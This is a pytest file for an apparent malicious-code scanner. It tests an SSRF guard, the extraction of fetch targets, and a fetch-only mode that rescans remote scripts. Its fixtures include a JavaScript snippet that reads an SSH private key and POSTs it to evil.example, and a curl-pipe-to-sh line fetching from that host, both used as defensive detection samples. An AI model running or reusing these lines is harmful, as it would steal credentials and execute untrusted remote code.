"""Fetch-only network — pull referenced remote code as evidence, never execute it.

No test makes a real network call: the SSRF guard is exercised with IP literals and an
injected resolver, and the end-to-end path monkeypatches the fetcher with canned bytes.
"""

from __future__ import annotations

import json
from pathlib import Path

import ipaddress
import pytest

# A recovered remote payload — credential theft + exfil, invisible until fetched.
_EXFIL_JS = (
    'const http=require("http");\n'
    'const cp=require("child_process");\n'
    'const fs=require("fs");\n'
    'const key=fs.readFileSync(process.env.HOME+"/.ssh/id_rsa");\n'
    'http.request({host:"evil.example",method:"POST"}).end(key);\n'
    'cp.execSync("id");\n'
)
_CURL_PIPE_SH = "#!/bin/sh\ncurl -fsSL https://evil.example/install.sh | sh\n"


# --- SSRF guard ------------------------------------------------------------

@pytest.mark.parametrize("url,safe", [
    ("https://8.8.8.8/ok", True),
    ("http://93.184.216.34/", True),
    ("http://127.0.0.1/x", False),                      # loopback
    ("http://169.254.169.254/latest/meta-data/", False),  # cloud metadata (link-local)
    ("http://10.0.0.5/", False),                        # private
    ("http://192.168.1.1/", False),
    ("http://172.16.0.1/", False),
    ("https://[::1]/", False),                          # ipv6 loopback
    ("http://[fd00::1]/", False),                       # ipv6 ULA
    ("http://[::ffff:10.0.0.1]/", False),               # ipv4-mapped private
    ("http://0.0.0.0/", False),                         # unspecified
    ("ftp://8.8.8.8/x", False),                         # scheme
    ("http://8.8.8.8:22/", False),                      # port
    ("file:///etc/passwd", False),
])
def test_guard_ip_literals(url, safe):
    from unmask.net import classify_url
    ok, _reason = classify_url(url)
    assert ok is safe


def test_guard_blocks_named_hosts_and_rebinding():
    from unmask.net import classify_url
    # convention-blocked names, no DNS needed
    assert classify_url("http://localhost/")[0] is False
    assert classify_url("http://svc.internal/")[0] is False
    # a public-looking host that resolves to a private IP is refused (rebinding guard)
    to_private = lambda h: [ipaddress.ip_address("10.1.2.3")]
    assert classify_url("https://sneaky.example/x", resolver=to_private)[0] is False
    # unresolvable is refused, not fetched blind
    def boom(h): raise OSError("nxdomain")
    ok, reason = classify_url("https://nope.example/x", resolver=boom)
    assert ok is False and "unresolvable" in reason


def test_fetch_blocks_internal_without_network(tmp_path):
    # classify runs before any socket open, so this touches no network.
    from unmask.net import fetch
    res = fetch("http://127.0.0.1/secret", str(tmp_path))
    assert not res.ok and res.path is None and res.blocked_reason


# --- reference extraction --------------------------------------------------

def test_extract_targets_needs_execution_intent(tmp_path):
    from unmask.net import extract_fetch_targets
    from unmask.scanner.observe import observe
    tgt = tmp_path / "t"
    tgt.mkdir()
    (tgt / "setup.sh").write_text(_CURL_PIPE_SH)              # curl | sh -> a target
    (tgt / "README.md").write_text("see https://docs.example/guide\n")  # doc link -> ignored
    obs, inv = observe(str(tgt))
    targets = extract_fetch_targets(obs, inv)
    urls = {t.url for t in targets}
    assert "https://evil.example/install.sh" in urls
    assert not any("docs.example" in u for u in urls)


# --- end to end (through the graph, fetcher monkeypatched) -----------------

def _fake_fetch(url, dest_dir, policy=None, *, resolver=None):
    import hashlib
    import os
    from unmask.net import FetchResult
    os.makedirs(dest_dir, exist_ok=True)
    out = os.path.join(dest_dir, "payload.js")
    Path(out).write_text(_EXFIL_JS)
    data = _EXFIL_JS.encode()
    return FetchResult(url=url, ok=True, path=out, status=200,
                       content_type="application/javascript", bytes_len=len(data),
                       sha256=hashlib.sha256(data).hexdigest(), final_url=url)


def test_fetch_only_reveals_remote_payload(tmp_path, monkeypatch):
    import unmask.net as netpkg
    from unmask import MCDConfig, run_mcd
    tgt = tmp_path / "tgt"
    tgt.mkdir()
    (tgt / "setup.sh").write_text(_CURL_PIPE_SH)

    monkeypatch.setattr(netpkg, "fetch", _fake_fetch)
    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd"), network="fetch-only"))
    report = json.loads(Path(result.report_paths["json"]).read_text())
    comps = report["summary"].get("compositions") or []
    # Only reachable by fetching + rescanning the remote script.
    assert "BP-EXFIL" in comps or "BP-CREDTHEFT" in comps
    fetched = report["fetch"]["fetched"]
    assert any(f["ok"] and f["url"] == "https://evil.example/install.sh" for f in fetched)
    assert result.disposition in {"review", "quarantine"}


def test_offline_does_not_fetch(tmp_path, monkeypatch):
    import unmask.net as netpkg
    from unmask import MCDConfig, run_mcd

    called = {"n": 0}

    def _tripwire(*a, **k):
        called["n"] += 1
        return _fake_fetch(*a, **k)

    monkeypatch.setattr(netpkg, "fetch", _tripwire)
    tgt = tmp_path / "tgt"
    tgt.mkdir()
    (tgt / "setup.sh").write_text(_CURL_PIPE_SH)

    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd")))  # network=offline
    report = json.loads(Path(result.report_paths["json"]).read_text())
    assert called["n"] == 0
    assert "fetch" not in report
    comps = report["summary"].get("compositions") or []
    assert "BP-EXFIL" not in comps
